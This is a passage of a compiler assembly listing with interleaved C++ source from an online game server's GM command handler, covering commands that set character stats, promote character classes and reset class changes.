  00661	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00664	66 8b 8d 18 fd
	ff ff		 mov	 cx, WORD PTR __strength$150[ebp]
  0066b	66 89 88 b4 00
	00 00		 mov	 WORD PTR [eax+180], cx

; 1336 : 			lpObj->Dexterity	= _dexterity;

  00672	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00675	66 8b 8d 14 fd
	ff ff		 mov	 cx, WORD PTR __dexterity$149[ebp]
  0067c	66 89 88 b6 00
	00 00		 mov	 WORD PTR [eax+182], cx

; 1337 : 			lpObj->Vitality		= _vitality;

  00683	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00686	66 8b 8d 10 fd
	ff ff		 mov	 cx, WORD PTR __vitality$148[ebp]
  0068d	66 89 88 b8 00
	00 00		 mov	 WORD PTR [eax+184], cx

; 1338 : 			lpObj->Energy		= _energy;

  00694	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00697	66 8b 8d 0c fd
	ff ff		 mov	 cx, WORD PTR __energy$147[ebp]
  0069e	66 89 88 ba 00
	00 00		 mov	 WORD PTR [eax+186], cx

; 1339 : 			lpObj->Life			= DCInfo.DefClass[Class].Life + 

  006a5	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  006af	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  006b9	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  006c0	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  006c6	2b ca		 sub	 ecx, edx
  006c8	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  006cc	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  006d6	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  006de	f3 0f 58 80 14
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+20]
  006e6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  006e9	f3 0f 11 80 bc
	00 00 00	 movss	 DWORD PTR [eax+188], xmm0

; 1340 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1341 : 			lpObj->MaxLife		= DCInfo.DefClass[Class].MaxLife +

  006f1	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  006fb	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  00705	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  0070c	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  00712	2b ca		 sub	 ecx, edx
  00714	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  00718	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  00722	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  0072a	f3 0f 58 80 18
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+24]
  00732	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00735	f3 0f 11 80 c0
	00 00 00	 movss	 DWORD PTR [eax+192], xmm0

; 1342 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1343 : 
; 1344 : 			lpObj->Mana			= DCInfo.DefClass[Class].Mana + 

  0073d	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00747	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  00751	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  00758	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  0075e	2b ca		 sub	 ecx, edx
  00760	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  00764	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  0076e	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  00776	f3 0f 58 80 20
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+32]
  0077e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00781	f3 0f 11 80 d0
	00 00 00	 movss	 DWORD PTR [eax+208], xmm0

; 1345 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;
; 1346 : 			lpObj->MaxMana		= DCInfo.DefClass[Class].MaxMana + 

  00789	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00793	69 8d 1c fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$151[ebp], 2400
  0079d	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  007a4	8b 8d 10 fd ff
	ff		 mov	 ecx, DWORD PTR __vitality$148[ebp]
  007aa	2b ca		 sub	 ecx, edx
  007ac	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  007b0	69 95 1c fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$151[ebp], 2400
  007ba	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  007c2	f3 0f 58 80 24
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+36]
  007ca	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  007cd	f3 0f 11 80 d4
	00 00 00	 movss	 DWORD PTR [eax+212], xmm0

; 1347 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;;
; 1348 : 
; 1349 : 			lpObj->LevelUpPoint = _temp_levelup - _temp;

  007d5	8b 85 08 fd ff
	ff		 mov	 eax, DWORD PTR __temp_levelup$146[ebp]
  007db	2b 85 04 fd ff
	ff		 sub	 eax, DWORD PTR __temp$145[ebp]
  007e1	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  007e4	89 81 a4 00 00
	00		 mov	 DWORD PTR [ecx+164], eax

; 1350 : 		
; 1351 : 			GCServerMsgStringSend("    !!", lpObj->m_Index, 1);

  007ea	6a 01		 push	 1
  007ec	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  007ef	8b 08		 mov	 ecx, DWORD PTR [eax]
  007f1	51		 push	 ecx
  007f2	68 00 00 00 00	 push	 OFFSET ??_C@_0CB@IKIHDOJD@?$MA?$LI?H?e?H?e?5?D?$LD?$LI?$KP?E?M?5?$LN?$LK?E?H?5?$MA?g?$LM?$LD?A?$KE?5?$LP?O?$LH?a?$CB@
  007f7	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  007fc	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1352 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  007ff	6a 01		 push	 1
  00801	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00804	8b 08		 mov	 ecx, DWORD PTR [eax]
  00806	51		 push	 ecx
  00807	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  0080c	83 c4 08	 add	 esp, 8

; 1353 : 		}
; 1354 : 	break;

  0080f	e9 a8 34 00 00	 jmp	 $LN2@Management
$LN72@Management:

; 1355 : 
; 1356 : 	//  (  )
; 1357 : 	case GMCMD_MODIFYSTAT_ENG:
; 1358 : 		{	
; 1359 : 			int Class = lpObj->Class;

  00814	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00817	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  0081e	89 8d 00 fd ff
	ff		 mov	 DWORD PTR _Class$144[ebp], ecx

; 1360 : 
; 1361 : 			int _strength, _dexterity, _vitality, _energy;
; 1362 : 
; 1363 : 			_strength	= GetTokenNumber();

  00824	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00827	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0082c	89 85 fc fc ff
	ff		 mov	 DWORD PTR __strength$143[ebp], eax

; 1364 : 			_dexterity	= GetTokenNumber();

  00832	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00835	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0083a	89 85 f8 fc ff
	ff		 mov	 DWORD PTR __dexterity$142[ebp], eax

; 1365 : 			_vitality	= GetTokenNumber();

  00840	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00843	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00848	89 85 f4 fc ff
	ff		 mov	 DWORD PTR __vitality$141[ebp], eax

; 1366 : 			_energy		= GetTokenNumber();

  0084e	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00851	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00856	89 85 f0 fc ff
	ff		 mov	 DWORD PTR __energy$140[ebp], eax

; 1367 : 
; 1368 : #ifdef NEW_SKILL_FORSKYLAND
; 1369 : 			lpObj->ChangeUP		= 0;

  0085c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0085f	c6 80 9f 00 00
	00 00		 mov	 BYTE PTR [eax+159], 0

; 1370 : #endif
; 1371 : 
; 1372 : 			lpObj->Experience	= 0;

  00866	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00869	c7 80 a8 00 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+168], 0

; 1373 : 
; 1374 : 			lpObj->Strength		= _strength;

  00873	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00876	66 8b 8d fc fc
	ff ff		 mov	 cx, WORD PTR __strength$143[ebp]
  0087d	66 89 88 b4 00
	00 00		 mov	 WORD PTR [eax+180], cx

; 1375 : 			lpObj->Dexterity	= _dexterity;

  00884	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00887	66 8b 8d f8 fc
	ff ff		 mov	 cx, WORD PTR __dexterity$142[ebp]
  0088e	66 89 88 b6 00
	00 00		 mov	 WORD PTR [eax+182], cx

; 1376 : 			lpObj->Vitality		= _vitality;

  00895	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00898	66 8b 8d f4 fc
	ff ff		 mov	 cx, WORD PTR __vitality$141[ebp]
  0089f	66 89 88 b8 00
	00 00		 mov	 WORD PTR [eax+184], cx

; 1377 : 			lpObj->Energy		= _energy;

  008a6	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  008a9	66 8b 8d f0 fc
	ff ff		 mov	 cx, WORD PTR __energy$140[ebp]
  008b0	66 89 88 ba 00
	00 00		 mov	 WORD PTR [eax+186], cx

; 1378 : 			lpObj->Life			= DCInfo.DefClass[Class].Life + 

  008b7	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  008c1	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  008cb	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  008d2	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  008d8	2b ca		 sub	 ecx, edx
  008da	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  008de	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  008e8	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  008f0	f3 0f 58 80 14
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+20]
  008f8	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  008fb	f3 0f 11 80 bc
	00 00 00	 movss	 DWORD PTR [eax+188], xmm0

; 1379 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1380 : 			lpObj->MaxLife		= DCInfo.DefClass[Class].MaxLife +

  00903	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  0090d	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  00917	0f b7 91 0c 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+12]
  0091e	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  00924	2b ca		 sub	 ecx, edx
  00926	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  0092a	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  00934	f3 0f 59 82 10
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+16]
  0093c	f3 0f 58 80 18
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+24]
  00944	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00947	f3 0f 11 80 c0
	00 00 00	 movss	 DWORD PTR [eax+192], xmm0

; 1381 : 								  ( _vitality - DCInfo.DefClass[Class].Vitality) * DCInfo.DefClass[Class].LevelLife ;
; 1382 : 
; 1383 : 			lpObj->Mana			= DCInfo.DefClass[Class].Mana + 

  0094f	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  00959	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  00963	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  0096a	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  00970	2b ca		 sub	 ecx, edx
  00972	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  00976	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  00980	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  00988	f3 0f 58 80 20
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+32]
  00990	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00993	f3 0f 11 80 d0
	00 00 00	 movss	 DWORD PTR [eax+208], xmm0

; 1384 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;
; 1385 : 			lpObj->MaxMana		= DCInfo.DefClass[Class].MaxMana + 

  0099b	69 85 00 fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$144[ebp], 2400
  009a5	69 8d 00 fd ff
	ff 60 09 00 00	 imul	 ecx, DWORD PTR _Class$144[ebp], 2400
  009af	0f b7 91 0e 00
	00 00		 movzx	 edx, WORD PTR ?DCInfo@@3Vclassdef@@A[ecx+14]
  009b6	8b 8d f4 fc ff
	ff		 mov	 ecx, DWORD PTR __vitality$141[ebp]
  009bc	2b ca		 sub	 ecx, edx
  009be	f3 0f 2a c1	 cvtsi2ss xmm0, ecx
  009c2	69 95 00 fd ff
	ff 60 09 00 00	 imul	 edx, DWORD PTR _Class$144[ebp], 2400
  009cc	f3 0f 59 82 1c
	00 00 00	 mulss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[edx+28]
  009d4	f3 0f 58 80 24
	00 00 00	 addss	 xmm0, DWORD PTR ?DCInfo@@3Vclassdef@@A[eax+36]
  009dc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  009df	f3 0f 11 80 d4
	00 00 00	 movss	 DWORD PTR [eax+212], xmm0

; 1386 : 								  ( _vitality - DCInfo.DefClass[Class].Energy) * DCInfo.DefClass[Class].LevelMana;;
; 1387 : 	
; 1388 : 			GCServerMsgStringSend("Modi.Stat Complete", lpObj->m_Index, 1);

  009e7	6a 01		 push	 1
  009e9	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  009ec	8b 08		 mov	 ecx, DWORD PTR [eax]
  009ee	51		 push	 ecx
  009ef	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@EIKIGGHM@Modi?4Stat?5Complete@
  009f4	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  009f9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1389 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  009fc	6a 01		 push	 1
  009fe	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a01	8b 08		 mov	 ecx, DWORD PTR [eax]
  00a03	51		 push	 ecx
  00a04	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  00a09	83 c4 08	 add	 esp, 8

; 1390 : 		}
; 1391 : 	break;

  00a0c	e9 ab 32 00 00	 jmp	 $LN2@Management
$LN73@Management:

; 1392 : 
; 1393 : 	// 
; 1394 : 	case GMCMD_CLASS_UP:
; 1395 : 		{	
; 1396 : 			int Class = lpObj->DbClass;

  00a11	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a14	0f b6 88 9e 00
	00 00		 movzx	 ecx, BYTE PTR [eax+158]
  00a1b	89 8d ec fc ff
	ff		 mov	 DWORD PTR _Class$139[ebp], ecx

; 1397 : 
; 1398 : 			if( Class == 0 )

  00a21	83 bd ec fc ff
	ff 00		 cmp	 DWORD PTR _Class$139[ebp], 0
  00a28	75 0c		 jne	 SHORT $LN74@Management

; 1399 : 				lpObj->DbClass = 1;

  00a2a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a2d	c6 80 9e 00 00
	00 01		 mov	 BYTE PTR [eax+158], 1
  00a34	eb 28		 jmp	 SHORT $LN78@Management
$LN74@Management:

; 1400 : 			else if( Class == 16)

  00a36	83 bd ec fc ff
	ff 10		 cmp	 DWORD PTR _Class$139[ebp], 16 ; 00000010H
  00a3d	75 0c		 jne	 SHORT $LN76@Management

; 1401 : 				lpObj->DbClass = 17;

  00a3f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a42	c6 80 9e 00 00
	00 11		 mov	 BYTE PTR [eax+158], 17	; 00000011H
  00a49	eb 13		 jmp	 SHORT $LN78@Management
$LN76@Management:

; 1402 : 			else if( Class == 32)

  00a4b	83 bd ec fc ff
	ff 20		 cmp	 DWORD PTR _Class$139[ebp], 32 ; 00000020H
  00a52	75 0a		 jne	 SHORT $LN78@Management

; 1403 : 				lpObj->DbClass = 33;

  00a54	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a57	c6 80 9e 00 00
	00 21		 mov	 BYTE PTR [eax+158], 33	; 00000021H
$LN78@Management:

; 1404 : #ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// "/"
; 1405 : 			else if( Class == 80 )
; 1406 : 				lpObj->DbClass = BLOODY_SUMMONER;
; 1407 : #endif			
; 1408 : 			
; 1409 : 			GCServerMsgStringSend("...", lpObj->m_Index, 1);

  00a5e	6a 01		 push	 1
  00a60	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a63	8b 08		 mov	 ecx, DWORD PTR [eax]
  00a65	51		 push	 ecx
  00a66	68 00 00 00 00	 push	 OFFSET ??_C@_07BKDMMMJL@?$MA?$PM?A?w?4?4?4@
  00a6b	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00a70	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1410 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			

  00a73	6a 01		 push	 1
  00a75	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00a78	8b 08		 mov	 ecx, DWORD PTR [eax]
  00a7a	51		 push	 ecx
  00a7b	e8 00 00 00 00	 call	 ?gObjCloseSet@@YAXHH@Z	; gObjCloseSet
  00a80	83 c4 08	 add	 esp, 8

; 1411 : 		}
; 1412 : 	break;

  00a83	e9 34 32 00 00	 jmp	 $LN2@Management
$LN79@Management:

; 1413 : #ifdef THIRD_CHANGEUP_SYSTEM_20070507	// ,  	
; 1414 : 	case GMCMD_THIRD_CHANGE_UP:		// /3
; 1415 : 		{
; 1416 : 			if( lpObj->DbClass == 0 || lpObj->DbClass == 16 || lpObj->DbClass == 32 || lpObj->DbClass == 80 )
; 1417 : 			{
; 1418 : 				lpObj->ChangeUP = 1;
; 1419 : 				lpObj->DbClass |= 0x1;
; 1420 : 			}
; 1421 : 			lpObj->ThirdChangeUp = 1;
; 1422 : 			lpObj->DbClass		|= 0x2;
; 1423 : 			
; 1424 : 			GCServerMsgStringSend( "3 ", lpObj->m_Index, 1 );
; 1425 : 			gObjCloseSet( lpObj->m_Index, CL_BACK );			
; 1426 : 		}
; 1427 : 	break;
; 1428 : 
; 1429 : 	case GMCMD_CHANGE_UP_ALL_RESET:	// /
; 1430 : 		{
; 1431 : 			lpObj->ChangeUP = 0;
; 1432 : 			lpObj->ThirdChangeUp = 0;
; 1433 : 
; 1434 : 			switch( lpObj->DbClass )
; 1435 : 			{			
; 1436 : 			case 1:
; 1437 : 			case GRAND_MASTER:
; 1438 : 				lpObj->DbClass = 0;
; 1439 : 				break;
; 1440 : 
; 1441 : 			case 17:
; 1442 : 			case BLADE_MASTER:
; 1443 : 				lpObj->DbClass = 16;
; 1444 : 				break;	
; 1445 : 				
; 1446 : 			case 33:
; 1447 : 			case HIGH_ELF:
; 1448 : 				lpObj->DbClass = 32;
; 1449 : 				break;	
; 1450 : 
; 1451 : 			case DUEL_MASTER:
; 1452 : 				lpObj->DbClass = 48;
; 1453 : 				break;	
; 1454 : 
; 1455 : 			case LORD_EMPEROR:
; 1456 : 				lpObj->DbClass = 64;
; 1457 : 				break;	
; 1458 : #ifdef ADD_SEASON_3_NEW_CHARACTER_SUMMONER_20070912	// 
; 1459 : 			case BLOODY_SUMMONER:
; 1460 : 			case DIMENSION_MASTER:
; 1461 : 				lpObj->DbClass = 80;
; 1462 : 				break;
; 1463 : #endif
; 1464 : 			}
; 1465 : 			GCServerMsgStringSend( "", lpObj->m_Index, 1 );
; 1466 : 			gObjCloseSet( lpObj->m_Index, CL_BACK );
; 1467 : 		}
; 1468 : 		break;
; 1469 : 		
; 1470 : 	case GMCMD_QUEST_ITEM:	// /
; 1471 : 		{
; 1472 : 			int iQuestIndex = GetTokenNumber();
; 1473 : 			if( iQuestIndex == 4 )
; 1474 : 			{
; 1475 : 				for( int i = 0; i <= 3; i++ )
; 1476 : 				{
